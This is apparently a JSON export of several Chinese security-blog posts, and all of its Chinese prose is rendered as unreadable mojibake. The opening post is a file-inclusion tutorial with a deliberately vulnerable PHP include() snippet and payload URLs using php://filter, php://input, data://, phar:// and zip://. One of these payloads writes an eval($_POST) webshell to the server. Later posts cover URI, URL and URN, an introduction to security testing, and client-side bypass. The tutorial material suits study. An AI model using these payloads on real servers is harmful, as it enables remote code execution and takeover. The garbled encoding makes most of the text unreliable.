å‡½æ•°è¿›è¡Œé…åˆä½¿ç”¨ï¼Œç”¨æ¥è¯»å–æœ¬åœ°ç£ç›˜æ–‡ä»¶ï¼Œå®ƒå¯ä»¥åœ¨æ‰“å¼€æ–‡ä»¶æ—¶å¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œå¤„ç† æ¡ä»¶ï¼šRead-onlyåªè¯»ï¼Œéœ€è¦å¼€å¯ allow_url_fopenï¼Œä¸éœ€è¦å¼€å¯ allow_url_includeï¼› å¯ä»¥ä½¿ç”¨å‚æ•°æ¥æŒ‡å®šè¿‡æ»¤çš„æ–¹å¼    åç§° æè¿°     resource=\u0026lt;è¦è¿‡æ»¤çš„æ•°æ®æµ\u0026gt; è¿™ä¸ªå‚æ•°æ˜¯å¿…é¡»çš„ã€‚å®ƒæŒ‡å®šäº†ä½ è¦ç­›é€‰è¿‡æ»¤çš„æ•°æ®æµã€‚   read=\u0026lt;è¯»é“¾çš„ç­›é€‰åˆ—è¡¨\u0026gt; è¯¥å‚æ•°å¯é€‰ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦åˆ†éš”ã€‚   write=\u0026lt;å†™é“¾çš„ç­›é€‰åˆ—è¡¨\u0026gt; è¯¥å‚æ•°å¯é€‰ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦åˆ†éš”ã€‚   \u0026lt;ï¼›ä¸¤ä¸ªé“¾çš„ç­›é€‰åˆ—è¡¨\u0026gt; ä»»ä½•æ²¡æœ‰ä»¥ read= æˆ– write= ä½œå‰ç¼€ çš„ç­›é€‰å™¨åˆ—è¡¨ä¼šè§†æƒ…å†µåº”ç”¨äºè¯»æˆ–å†™é“¾ã€‚    è¯•ä¸€ä¸‹è¯•è¯• \u0026lt;?php $filename = $_GET[\u0026#39;filename\u0026#39;]; include($filename); echo $filename; ?\u0026gt;è¿™é‡Œæˆ‘ä»¬é€šè¿‡ php://filter å¯ä»¥å¾—åˆ° lrfiSession.php ä¸­ä»¥base64åŠ å¯†çš„å†…å®¹ï¼Œç„¶åå†è§£å¯†å¾—åˆ°å…¶æ˜æ–‡å†…å®¹ http://localhost/lrfiTest.php?filename=php://filter/read=convert.base64-encode/resource=lrfiSession.php   å¯ç”¨çš„è¿‡æ»¤å™¨åˆ—è¡¨ï¼š https://www.php.net/manual/zh/filters.php     php://input\nphp://inputæ˜¯ä¸€ä¸ªâ€œåªè¯»â€çš„æµï¼Œå®ƒå…è®¸æˆ‘ä»¬ç›´æ¥è¯»å–POSTä¸Šæ²¡æœ‰ç»è¿‡è§£æçš„åŸå§‹æ•°æ® enctype=\u0026ldquo;multipart/form-data\u0026rdquo; çš„æ—¶å€™ php://input æ˜¯æ— æ•ˆçš„ éœ€è¦åŒæ—¶å¼€å¯ allow_url_fopen ï¼Œä»¥åŠ allow_url_include \u0026lt;?php $filename = $_GET[\u0026#39;filename\u0026#39;]; include($filename); ?\u0026gt;æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ php://input æ¥æ‰§è¡ŒPOSTä¸­çš„phpä»£ç ï¼Œä»è€Œå†™å…¥ä¸€å¥è¯æœ¨é©¬åˆ°æœåŠ¡å™¨æ–‡ä»¶ç›®å½•ä¸‹ http://localhost/lrfiTest.php?filename=php://input \u0026lt;?PHP fputs(fopen(\u0026#39;lrfiInput.php\u0026#39;,\u0026#39;w\u0026#39;),\u0026#39;\u0026lt;?php eval($_POST[a]) ?\u0026gt;\u0026#39;);?\u0026gt;     php://output\næµ‹è¯•   file:// file:// ä»£è¡¨äº†æœ¬åœ°æ–‡ä»¶çš„è·¯å¾„ï¼Œå®ƒä¹Ÿæ˜¯é»˜è®¤çš„åˆ†è£…ç±»ï¼Œå¦‚æœæ–‡ä»¶è·¯å¾„æ²¡æœ‰æŒ‡æ˜ä½¿ç”¨å“ªä¸€ä¸ªåˆ†è£…ç±»ï¼Œé‚£å°±é»˜è®¤æ˜¯ file:// Usage /path/to/file.ext relative/path/to/file.ext fileInCwd.ext C:/path/to/winfile.ext C:\\path\\to\\winfile.ext \\\\smbserver\\share\\path\\to\\winfile.ext file:///path/to/file.ext data:// data:// æ˜¯ä¸€ä¸ªæ•°æ®æµå°è£…å™¨ ä½¿ç”¨æ ¼å¼ï¼š data:[\u0026lt;mime type\u0026gt;][;charset=\u0026lt;charset\u0026gt;][;base64],\u0026lt;encoded data\u0026gt;  åè®®å¤´ï¼šdata://ï¼Œä½¿åé¢çš„å†…å®¹è¢«è¯†åˆ«ä¸ºä¸€ä¸ªdata URIèµ„æº  MIMEç±»å‹ï¼Œæˆ‘ä»¬åœ¨ File upload ä¸­ä¹Ÿæ›¾ç»ä»‹ç»è¿‡ï¼Œä¾‹å¦‚text/plain, image/jpeg, image/gif, image/png, etc.  ç¼–ç è®¾ç½®ï¼Œé»˜è®¤ç¼–ç ä¸º charset=US=ASCII ï¼ˆè‡ªåŠ¨ç¼–ç ä¸º%xxï¼‰  base64ç¼–ç è®¾å®šï¼Œå¯é€‰é¡¹ï¼Œbase64ç¼–ç ä¸­ä»…åŒ…å«0-9,a-z,A-Z,+,/,=ï¼Œå…¶ä¸­=æ˜¯ç”¨æ¥ç¼–ç è¡¥ç™½çš„  DATA URIæ‰€æ‰¿è½½çš„å†…å®¹ï¼ˆä¹Ÿæ˜¯æˆ‘ä»¬æ’å…¥è¦æ³¨å…¥çš„æ¶æ„ä»£ç çš„åœ°æ–¹ï¼‰ï¼Œå®ƒå¯ä»¥æ˜¯çº¯æ–‡æœ¬ç¼–å†™çš„å†…å®¹ï¼Œä¹Ÿå¯ä»¥æ˜¯ç»è¿‡base64ç¼–ç çš„å†…å®¹ã€‚   ä½¿ç”¨æ¡ä»¶ï¼š allow_url_fopen: on allow_url_include: on/off phpç‰ˆæœ¬â‰¥php5.2 éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå½“allow_url_includeä¸ºonæ—¶ï¼Œä»»æ„æ–‡ä»¶åŒ…å«å°±ä¼šæˆä¸ºä»»æ„å‘½ä»¤æ‰§è¡Œ åˆ©ç”¨ï¼š plaintext: ?filename=data://text/plain,\u0026lt;?php phpinfo()?\u0026gt; or encoded by base64: ?filename=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4= http://localhost/lrfiTest.php?filename=data://text/plain,\u0026lt;?php phpinfo()?\u0026gt;  phar:// pharåªèƒ½ç”¨åœ¨æœ¬åœ°æ–‡ä»¶ä¸Šï¼Œå› æ­¤æˆ‘ä»¬æ‰€ä¸¾çš„ä¾‹å­éƒ½æ˜¯åœ¨æ–‡ä»¶ä¸Šä¼ æˆåŠŸçš„åŸºç¡€ä¸Šè¿›è¡Œçš„ ä½¿ç”¨æ ¼å¼ ?filename=phar://[å‹ç¼©åŒ…åç§°][/å†…éƒ¨æ–‡ä»¶åç§°] ?filename=phar://xxx.png/shell.php å‹ç¼©æ–‡ä»¶å¯ä»¥æ”¹ä¸ºä»»æ„åç¼€ å‡è®¾æˆ‘ä»¬é€šè¿‡æ–‡ä»¶ä¸Šä¼ æ¼æ´ä¸Šä¼ äº†ä¸€ä¸ªå«åš shell.png çš„å‹ç¼©åŒ…ï¼ˆä¸€å®šè¦ç”¨zipå‹ç¼©ï¼Œrarä¸è¡Œï¼‰ï¼Œç„¶åshell.pngè§£å‹ç¼©ä¹‹åæ˜¯phpinfo.phpè¿™ä¸ªæ–‡ä»¶ é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å†åˆ©ç”¨ phar æ¥è¿›è¡Œè§£å‹ç¼©å¹¶æ‰§è¡Œ http://localhost/lrfiTest.php?filename=phar://shell.png/phpinfo.php http://localhost/lrfiTest.php?filename=phar://[ç»å¯¹è·¯å¾„]shell.png/phpinfo.php  zip:// ç”¨æ³•ä¸pharæœ‰æ‰€ä¸åŒ ?filename=zip://[å‹ç¼©æ–‡ä»¶ç»å¯¹è·¯å¾„]#[å‹ç¼©æ–‡ä»¶å†…çš„å­æ–‡ä»¶å] ?filename=zip://xxx.png#shell.phpã€‚ æ¡ä»¶ï¼š PHP \u0026gt; =5.3.0ï¼Œæ³¨æ„åœ¨windowsä¸‹æµ‹è¯•è¦ 5.3.0\u0026lt;PHP\u0026lt;5.4 æ‰å¯ä»¥ åŒæ—¶ï¼Œ#åœ¨urlä¸­è¦ç¼–ç ä¸º%23ï¼Œå¦åˆ™æµè§ˆå™¨é»˜è®¤ä¸ä¼šä¼ è¾“ç‰¹æ®Šå­—ç¬¦ã€‚ http://localhost/lrfiTest.php?filename=zip://[absolute_path]shell.png%23phpinfo.php  Reference Webå®‰å…¨å®æˆ˜ç³»åˆ—ï¼šæ–‡ä»¶åŒ…å«æ¼æ´ PHPä¼ªåè®®æ€»ç»“ æ–‡ä»¶åŒ…å«æ¼æ´ä¸phpä¼ªåè®® æ”¯æŒçš„åè®®å’Œå°è£…åè®® åˆ©ç”¨ phar æ‹“å±• php ååºåˆ—åŒ–æ¼æ´æ”»å‡»é¢ ","date":"2022-05-21T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/lrfi_basic/","title":"Local/Remote File Inclusion æ–‡ä»¶åŒ…å«æ¼æ´"},{"content":"URI \u0026amp; URL \u0026amp; URN çš„å…³ç³» å¾ˆé•¿ä¸€æ®µæ—¶é—´ä»¥æ¥ï¼Œæˆ‘éƒ½æä¸æ¸…æ¥šURIï¼ŒURLçš„å…³ç³»ï¼Œæœ€è¿‘å…»æˆäº†å†™åšå®¢çš„ä¹ æƒ¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æ¥ä¸€èµ·æææ˜ç™½ã€‚ å¦‚æœæœ‰å’Œæˆ‘ä¸€æ ·æä¸æ¸…æ¥šçš„å¸ˆå‚…ï¼Œæˆ‘åªèƒ½è¯´è¿™ä¸æ€ªæˆ‘ä»¬ï¼Œé¦–å…ˆè¿™ä¸¤ä¸ªç©æ„å„¿é•¿çš„å¾ˆåƒï¼Œå¾ˆå®¹æ˜“å°±ææ··ï¼Œå› æ­¤åœ¨æœ¬æ–‡ä¸­å°†å…¨éƒ¨é‡‡ç”¨å¤§å†™çš„å½¢å¼åŠ ä»¥åŒºåˆ†ã€‚ å…¶æ¬¡å°±æ˜¯æˆ‘åˆ°ç›®å‰ä¸ºæ­¢çš„ä¸€ä¸ªè§‚ç‚¹ï¼Œç”±äºä¸­æ–‡è¿‡äºåšå¤§ç²¾æ·±ï¼Œå¯¼è‡´å¾ˆå¤šç¿»è¯‘è¿‡æ¥çš„å†…å®¹å˜å¾—éå¸¸ç»•å£éš¾æ‡‚ï¼ŒåŒæ—¶æºæ‚ç€ä¸€äº›ä¸æ°å½“çš„æ¯”å–»ï¼Œå¯¼è‡´äº†è¿™äº›æ¦‚å¿µä¹‹é—´çš„å…³ç³»å˜å¾—éå¸¸æ¨¡ç³Šã€‚ URI URI, Uniform Resource Identifier, ç»Ÿä¸€èµ„æºæ ‡å¿—ç¬¦ â€œç»Ÿä¸€â€ï¼Œè¡¨ç¤ºä½¿ç”¨ä¸€ç§ç»Ÿä¸€çš„è§„èŒƒæ¥è¡¨ç¤º â€œèµ„æºæ ‡è¯†ç¬¦â€ï¼Œè¡¨ç¤ºURIæ˜¯ç”¨æ¥æŒ‡ä»£ä¸€ç§èµ„æºï¼Œç½‘é¡µï¼Œå›¾ç‰‡ï¼Œè§†é¢‘ï¼Œetc.. ä¸‹é¢æ˜¯URIçš„ç»Ÿä¸€æ ¼å¼è§„èŒƒï¼Œä¾æ¬¡ç”±äº”ä¸ªéƒ¨åˆ†ç»„æˆ URI = scheme \u0026#34;:\u0026#34; [\u0026#34;//\u0026#34; authority] path [\u0026#34;?\u0026#34; query] [\u0026#34;#\u0026#34; fragment] å…¶ä¸­Authorityå¯ä»¥åˆ’æˆä¸‰ä¸ªå­æ¨¡å— authority = [userinfo \u0026#34;@\u0026#34;] host [\u0026#34;:\u0026#34; port]  å…·ä½“çš„å„ä¸ªç»„æˆæ¨¡å—å¤§å®¶å¯ä»¥å»Wikipediaä¸€ä¸ªä¸ªæ£€æŸ¥è¿‡æ¥ æˆ‘ä»¬ç”¨ä¸€ä¸ªä¾‹å­ç»“æŸè¿™ä¸ªç« èŠ‚ï¼š https://john.doe@www.example.com:123/forum/questions/?tag=networking\u0026order=newest#top ç›¸ä¿¡è¿™ä¸ªä¹Ÿæ˜¯å¤§å¤šæ•°äººå¸¸è§çš„ä¸€ä¸ªUR*çš„ä¾‹å­ï¼Œé‚£ä¹ˆå¤§å®¶ä¹Ÿä¼šå¥½å¥‡é‚£ä¹ˆURLåº”è¯¥é•¿ä»€ä¹ˆæ ·çš„ï¼Ÿæˆ‘ä»¬æ¥ç€æ¥çœ‹ URL URL, Uniform Resource Locator, ç»Ÿä¸€èµ„æºå®šä½ç¬¦ å’Œä¹‹å‰ä¸€æ ·ï¼Œæˆ‘ä»¬ä»å…¶åå­—å‡ºå‘æ¥è§£é‡ŠURLçš„ä½œç”¨ â€œç»Ÿä¸€â€ï¼ŒåŒæ ·ï¼Œè¡¨ç¤ºä½¿ç”¨ä¸€ç§ç»Ÿä¸€çš„è§„èŒƒæ¥è¡¨ç¤º â€œèµ„æºå®šä½ç¬¦â€ï¼Œè¡¨ç¤ºURLéœ€è¦å¸®åŠ©æ‰¾åˆ°ä¸€ä¸ªèµ„æºæ‰€åœ¨çš„ä½ç½®ï¼Œä½¿ç”¨ç”¨æˆ·èƒ½å¤Ÿè·å–åˆ°è¿™ä¸ªèµ„æº é‚£å®ƒç©¶ç«Ÿåº”è¯¥é•¿ä»€ä¹ˆæ ·å‘¢ï¼Ÿ  å’Œæˆ‘ä»¬ä»¥å‰æåˆ°çš„æ ¼å¼ä¸€æ¨¡ä¸€æ ·ï¼Œè¿™å°±æ˜¯ä¸€ä¸ªURLï¼šhttps://john.doe@www.example.com:123/forum/questions/?tag=networking\u0026order=newest#top å…ˆåˆ«æ€¥ç€ç³Šæ¶‚ï¼Œæˆ‘ä»¬å…ˆä»”ç»†çœ‹è¿™å¼ å›¾ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œæœ‰å¾ˆå¤šå¯é€‰é¡¹ï¼Œä½œä¸ºä¸€ä¸ªURLè™½ç„¶ä¹Ÿä½¿ç”¨åŒæ ·çš„è¯­æ³•è§„èŒƒï¼Œä½†æ˜¯å’Œå®ƒçš„åå­—ä¸€æ ·ï¼Œå®ƒéœ€è¦ä¸€åˆ‡èƒ½å¤ŸæŒ‡ç¤ºä¸€ä¸ªèµ„æºä½ç½®çš„å¯é€‰é¡¹åè¿‡æ¥è¯´ï¼ŒURIï¼Œåªéœ€è¦èƒ½å¤Ÿä»£è¡¨è¿™ä¸ªèµ„æºçš„åç§°å°±å¯ä»¥äº†ï¼Œä¸éœ€è¦å®ŒæˆæŒ‡ç¤ºçš„å·¥ä½œï¼Œå› æ­¤å¯ä»¥é€‰æ‹©å¾ˆå°‘çš„é€‰é¡¹ï¼Œé‚£ä¹ˆä¸€æ—¦å®Œæˆäº†æŒ‡ç¤ºèµ„æºä½ç½®çš„ä»»åŠ¡ï¼Œä¸€ä¸ªURIä¹Ÿå¯ä»¥è¢«å«åšURL ä¹Ÿå°±æ˜¯è¯´ï¼š  URIåŒ…å«URLï¼Œ  URIæ˜¯URLçš„çˆ¶ç±»  ä¸€ä¸ªèƒ½æŒ‡ç¤ºèµ„æºä½ç½®çš„URIä¹Ÿè¢«å«åšURL  ä¸€ä¸ªURLä¸€å®šæ˜¯ä¸€ä¸ªURI  ä¸€ä¸ªURIä¸ä¸€å®šæ˜¯ä¸€ä¸ªURLï¼Œå®ƒè¿˜å¯ä»¥æ˜¯URN   URN URN, Uniform Resource Name, ç»Ÿä¸€èµ„æºåç§°ï¼Œæ˜¯ä¸€ç§ç‰¹æ®Šçš„URIï¼Œç‰¹ç‚¹æ˜¯å…¶schemeä½¿ç”¨ urn: â€œç»Ÿä¸€â€ï¼Œè¡¨ç¤ºä½¿ç”¨ä¸€ç§ç»Ÿä¸€çš„è§„èŒƒæ¥è¡¨ç¤º â€œèµ„æºåç§°â€ï¼Œè¡¨è¾¾äº†URNä¼šè¡¨ç¤ºä¸€ä¸ªèµ„æºçš„åç§°ï¼Œå¹¶ç§°è¿™ä¸ªæ ‡è¯†ä¼šåŒæ—¶åœ¨ç©ºé—´ä»¥åŠæ—¶é—´ä¸Šä¿æŒå…¶å”¯ä¸€æ€§ï¼ŒåŠå…¨çƒå”¯ä¸€ï¼Œå¹¶ä¸”åœ¨æœªæ¥ä¹Ÿä¼šä¿æŒå”¯ä¸€ å…¶ä¸URIå’ŒURLçš„åŒºåˆ«å°±åœ¨äºå…¶åœ¨æ—¶ç©ºä¸Šçš„å”¯ä¸€æ€§ï¼Œä»¥åŠå…¶å¹¶ä¸èƒ½ç”¨æ¥å®šä½ä¸€ä¸ªèµ„æº  Appendix URI scheme URI schemeä¹Ÿå°±æ˜¯æ‰€æœ‰URIçš„ç¬¬ä¸€éƒ¨åˆ†ï¼Œå¾ˆå¤šä¸­æ–‡çš„ç¿»è¯‘å°†å…¶ç§°ä½œâ€œåè®®â€ï¼Œä½†æˆ‘æ€»è§‰å¾—æœ‰ç‚¹æ€ªæ€ªçš„ï¼Œå› ä¸ºå¦‚æœæ˜¯åè®®çš„è¯æˆ‘ä»¬ä¸€èˆ¬ä¼šç”¨protocolï¼Œä½†æ˜¯çœ‹åˆ°ftpï¼Œhttpåˆè§‰å¾—æ— æ³•åé©³ï¼Œç›´åˆ°æˆ‘ä»¬çœ‹åˆ°äº†ä¸€ä¸ªStackExchangeä¸Šçš„å›ç­”ï¼š â€œIt simply tells you how to interpret the part of the URL after the colon. \u0026hellip; This isn\u0026rsquo;t identical to a protocol, because there is no transport layer or encodingâ€ URI schemeä»…ä»…æ˜¯å‘Šè¯‰æµè§ˆå™¨åº”è¯¥å¦‚ä½•å»è§£æåé¢çš„å†…å®¹ï¼Œä¾‹å¦‚ file: å°±è¡¨ç¤ºåé¢çš„æ˜¯æˆ‘ä»¬éœ€è¦è®¿é—®çš„æœ¬åœ°èµ„æºçš„ç›®å½•ï¼Œ http: å°±è¡¨ç¤ºéœ€è¦ç”¨åé¢çš„è·¯å¾„æ¥å‘èµ·HTTPè¿æ¥ã€‚ Reference What is the difference between a URI, a URL and a URN? Uniform Resource Identifier URL Uniform Resource Name What is a URI Scheme? ","date":"2022-05-21T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/uri_url_urn/","title":"URI \u0026 URL \u0026 URN çš„å…³ç³»"},{"content":"SCT Topic 1 Introduction to Security Testing What is Security Testing? ä»€ä¹ˆæ˜¯å®‰å…¨æµ‹è¯• å®‰å…¨æµ‹è¯•æ˜¯ä¸€ä¸ªå¾ˆå¹¿æ³›çš„æ¦‚å¿µï¼Œæˆ‘ä»¬å¯ä»¥åˆ—ä¸¾å‡ ä¸ªå…¸å‹çš„æ´»åŠ¨ï¼š  Security Audit å®‰å…¨å®¡è®¡  Vulnerability Assessment æ¼æ´è¯„ä¼°  Penetration Testing æ¸—é€æµ‹è¯•  Red Teaming çº¢é˜Ÿæµ‹è¯•  Ethical hacking æœ‰é“å¾·çš„é»‘å®¢æ”»å‡»   åœ¨è¿™å‘¨çš„topicä¸­æˆ‘ä»¬ä¼šå…·ä½“å±•å¼€ä»‹ç»æ¯ä¸€ä¸ªæ´»åŠ¨æ‰€å¯¹åº”çš„ç»†èŠ‚ åœ¨æ­¤ä¹‹å‰ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆå¯¹å®‰å…¨æµ‹è¯•ä¸‹ä¸€ä¸ªå®šä¹‰ï¼š Security Testing is the process to reveal flaws in a system in terms of Confidentiality, Integrity, Availability (CIA). å®‰å…¨æµ‹è¯•å°±æ˜¯ä¸€ä¸ªæ­éœ²ç³»ç»Ÿåœ¨ä¿å¯†æ€§ï¼Œå®Œæ•´æ€§å’Œå¯ç”¨æ€§ï¼ˆCIAï¼‰æ–¹é¢çš„ç¼ºé™·çš„è¿‡ç¨‹ CIAä¹Ÿæ˜¯æ‰€æœ‰å®‰å…¨è¯é¢˜ä¸­æœ€é‡è¦çš„ä¸‰è¦ç´ ï¼š  Confidentiality ä¿å¯†æ€§: é™åˆ¶æ²¡æœ‰æˆæƒçš„ç”¨æˆ·è®¿é—®èµ„æº  Integrity å®Œæ•´æ€§ï¼šé™åˆ¶æ²¡æœ‰æˆæƒçš„ç”¨æˆ·ä¿®æ”¹èµ„æº  Availability å¯ç”¨æ€§: ä¿è¯èµ„æºéšæ—¶å¯ç”¨   ç„¶åæˆ‘ä»¬å†æ€»ç»“é»‘å®¢çš„æ”»å‡»å½’ä¸ºä¸‰ç§ï¼š  Exploit the configuration done by the system administrator ä¿®æ”¹ç®¡ç†å‘˜çº§åˆ«çš„ç³»ç»Ÿé…ç½®  Exploit how the users use the system/service åˆ©ç”¨ç”¨æˆ·å¯¹ç³»ç»Ÿè¿›è¡Œæ“ä½œ  Exploit software/hardware vulnerabilities åˆ©ç”¨è½¯ç¡¬ä»¶çš„æ¼æ´   Penetration Testing æ¸—é€æµ‹è¯• Penetration Testing (PT) æ¸—é€æµ‹è¯•é€šè¿‡å¤šç§æ¼æ´æµ‹è¯•å·¥å…·æ¥æ¨¡æ‹ŸçœŸå®çš„æ”»å‡»æ‰‹æ®µæ¥å°è¯•æ¸—é€è®¡ç®—æœºç³»ç»Ÿçš„æ´»åŠ¨ã€‚ Penetration Testing Execution Standard (PTES) åˆ—ä¸¾äº†æ¸—é€æµ‹è¯•çš„æ­¥éª¤ï¼Œä½†è¿™äº›æ­¥éª¤ä¹Ÿå¹¶ä¸å›ºå®š  Pre-engagement Interactions é¢„äº¤äº’  Intelligence Gathering æƒ…æŠ¥æ”¶é›†  Threat Modeling å¨èƒå»ºæ¨¡  Vulnerability Analysis æ¼æ´åˆ†æ  Exploitation æ¼æ´åˆ©ç”¨  Post Exploitation åæ¼æ´åˆ©ç”¨  Reporting æŠ¥å‘Š   å…·ä½“æ¯ä¸€ä¸ªç¯èŠ‚å¤§å®¶å¯ä»¥æ ¹æ®ä¸Šé¢çš„é“¾æ¥æŸ¥çœ‹æ–‡æ¡£ï¼Œè¿™é‡Œéœ€è¦éœ€è¦å¼ºè°ƒçš„å°±æ˜¯æœ€åçš„æŠ¥å‘Šç¯èŠ‚ï¼Œè¿™ä¹Ÿæ˜¯å¾ˆèƒ½ååº”ä¸“ä¸šæ€§çš„åœ°æ–¹ï¼Œèƒ½æ¸…æ¥šæè¿°æ•´ä¸€ä¸ªæ¸—é€æµ‹è¯•ï¼Œå¯¹äºåç»­å®¢æˆ·çš„ç†è§£ï¼Œé‡‡å–æªæ–½æ˜¯éå¸¸é‡è¦çš„ï¼ˆå°±æ˜¯ä¸ºäº†è¿™ä»½æŠ¥å‘Šï¼Œæ‰è¿›è¡Œçš„è¿™ä¸ªæ¸—é€æµ‹è¯•ï¼‰ã€‚ Security Audit å®‰å…¨å®¡è®¡ï¼Œä¸»è¦æ˜¯ä¸ºäº†æ£€æŸ¥ä¼ä¸šçš„å®‰å…¨æ˜¯å¦æ»¡è¶³æ ‡å‡†ï¼ˆISO 27000) ä»¥åŠèµ„æ ¼è¯ä¹¦è€Œè¿›è¡Œçš„ï¼Œæˆ‘ä»¬åœ¨å®‰å…¨ç®¡ç†è¯¾ç¨‹ä¸­å·²ç»çœ‹è¿‡äº†ï¼Œå¯¹äºä¸­å°ä¼ä¸šçš„å®‰å…¨èµ„æ ¼è¯ä¹¦æ£€æŸ¥æ˜¯éå¸¸é‡è¦ï¼Œå‡å°‘ä¸€äº›åŸºç¡€çš„æ¼æ´å¯ä»¥å¸®åŠ©ä¼ä¸šé¿å…å¾ˆå¤šçš„é—®é¢˜ï¼Œä¸ªäººè®¤ä¸ºå®‰å…¨å®¡è®¡éšç€å›½å†…çš„å®‰å…¨æ„è¯†çš„æé«˜ä»¥åŠè§„èŒƒåŒ–çš„æé«˜ä¹Ÿä¼šé€æ¸æ™®åŠä»¥åŠå½¢æˆäº§ä¸šè¿›ä¸€æ­¥å¢åŠ å®‰å…¨å°±ä¸šã€‚ Vulnerability Analysis (VA) æ¼æ´åˆ†æ Vulnerability Analysis (VA) æ¼æ´åˆ†ææ˜¯å•çº¯åœ°åˆ©ç”¨å·¥å…·è¿›è¡Œæ‰«æç³»ç»Ÿå’Œè½¯ä»¶ä¸­çš„æ¼æ´çš„æ´»åŠ¨ï¼Œåœ¨è¿›è¡Œæ‰«æçš„æ—¶å€™ï¼Œå¿…é¡»è¦åŒæ—¶ä½¿ç”¨å¼€æºå’Œå•†ä¸šçš„å·¥å…·ï¼Œå› ä¸ºæˆ‘ä»¬æ— æ³•ä¿è¯é»‘å®¢ä¸ä½¿ç”¨è¿™äº›å•†ä¸šå·¥å…·ã€‚ åŒæ—¶ä¸æ¸—é€æµ‹è¯•ä¸åŒçš„æ˜¯ï¼Œæ¼æ´åˆ†æåªæ˜¯å•çº¯çš„æ‰«æå·¥å…·ä½¿ç”¨ï¼Œè€Œä¸æ¶‰åŠä»»ä½•çš„äº¤äº’ Red Teaming (RT) çº¢é˜Ÿæµ‹è¯• çº¢é˜Ÿæµ‹è¯•ä¹Ÿæ˜¯å®‰å…¨æµ‹è¯•å‘˜è¿›è¡Œæ¨¡æ‹Ÿæ”»å‡»æ¥æµ‹è¯•ç›®æ ‡ç³»ç»Ÿçš„å®‰å…¨æ€§ è¿™é‡Œæœ‰ä¸¤ä¸ªè®¡é‡çš„å•ä½ï¼š   Time To Detect (TTD) æ£€æµ‹å“åº”æ—¶é—´ï¼š æŒ‡çš„æ˜¯ç›®æ ‡ç³»ç»Ÿé€šè¿‡æ€æ¯’è½¯ä»¶æˆ–è€…IDSæ‰«æåˆ°æœ¬æ¬¡å…¥ä¾µæˆ–è€…ç—…æ¯’æ‰€éœ€è¦çš„æ—¶é—´ï¼Œå…·ä½“çš„è¡¨ç°ä¸ºå®‰å…¨åˆ†æå¸ˆç¬¬ä¸€æ¬¡è®°å½•æˆæŠ¥å‘Šçš„æ—¶é—´   Time To Mitigate (TTM) è§£å†³å“åº”æ—¶é—´ï¼š æŒ‡çš„æ˜¯ç›®æ ‡ä¼ä¸šçš„å®‰å…¨å·¥ç¨‹å¸ˆå¤šä¹…èƒ½ç»„ç»‡æœ¬æ¬¡æ”»å‡» ä¹Ÿååº”äº†å…¶ä»–çš„ä¸€äº›å†…å®¹ï¼š   å®‰å…¨å›¢é˜Ÿä¸ITéƒ¨é—¨çš„é…åˆæ˜¯å¦é«˜æ•ˆ   å‘˜å·¥æ˜¯å¦é™·å…¥äº†ææ…Œï¼ˆå®‰å…¨åŸ¹è®­ï¼‰     ä½†æ˜¯è¦æ³¨æ„å°†æ¸—é€æµ‹è¯•ä¸çº¢é˜Ÿæµ‹è¯•åŒºåˆ†å¼€  Red Team çº¢é˜Ÿ  æ”»å‡»è€…ï¼ˆæ¨¡æ‹Ÿï¼‰  æ¨¡ä»¿æ”»å‡»çš„ä¸€æ•´å¥—æµç¨‹  ä¸å‘ŠçŸ¥è“é˜Ÿä½•æ—¶ç”¨ä½•ç§æ–¹æ³•è¿›è¡Œè¿›æ”»    Blue Team è“é˜Ÿ   ä¼ä¸šä¸­çš„é˜²å¾¡è€…   ä¸ä¼šè¢«å‘ŠçŸ¥æœ‰çº¢é˜Ÿçš„å­˜åœ¨ï¼ˆä½†æ˜¯åœ¨æ¸—é€æµ‹è¯•ä¸­ï¼ŒåŒæ–¹ä¼šè¿›è¡Œåˆä½œï¼‰         Pennetration Tests Red Teaming     Security Assessment Methodical Flexible   Scope ä¸¥æ ¼çš„ç›®æ ‡ æ²¡æœ‰å…·ä½“çš„è§„åˆ™    1-2å‘¨çš„æµç¨‹ 2-6ä¸ªæœˆçš„å‚ä¸    å‘ŠçŸ¥å¯¹æ–¹ä¼ä¸šçš„è“é˜Ÿ ä¸é€šçŸ¥å¯¹æ–¹çš„è“é˜Ÿ    è¯†åˆ«æ¼æ´ æµ‹è¯•è“é˜Ÿåœ¨ç¨‹åºï¼Œå®‰å…¨æ”¿ç­–ï¼Œé˜²å¾¡å·¥å…·ä»¥åŠæŠ€èƒ½     ç”¨æ¥æµ‹è¯•TTDä¸TTMçš„æ°´å¹³     å¿…é¡»åœ¨åˆæ³•çš„èŒƒå›´ä¸‹è¿›è¡Œ    ","date":"2022-05-20T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/sct_topic_1_introduction_to_security_testing/","title":"SCT Topic 1 Introduction to Security Testing"},{"content":"SCT Topic 4: Web Attacks - Bypassing client-side authentication and others Bypassing client-Side Controls å®¢æˆ·ç«¯æ£€æŸ¥ç»•è¿‡ ç»•è¿‡å®¢æˆ·ç«¯çš„æ£€æŸ¥ä¸»è¦æ˜¯é’ˆå¯¹ä¸¤ä¸ªæ–¹é¢ï¼Œ  é¡µé¢HTMLä»£ç   HTTPè¯·æ±‚   å®¢æˆ·ç«¯çš„æ£€æŸ¥ä¸€èˆ¬æ¥è¯´éƒ½èƒ½è¢«è½»æ¾çš„ç»•è¿‡ï¼Œä¸»è¦çš„é˜²å¾¡æ‰‹æ®µè¿˜æ˜¯æœåŠ¡å™¨ç«¯éœ€è¦è¿›è¡Œä¸¥æ ¼çš„è¾“å…¥å‡€åŒ–ï¼Œä½†æ˜¯è®¾ç½®åˆç†çš„å®¢æˆ·ç«¯æ£€æŸ¥å¯ä»¥å¸®åŠ©æ­£å¸¸çš„ç”¨æˆ·å‡å°‘éº»çƒ¦ 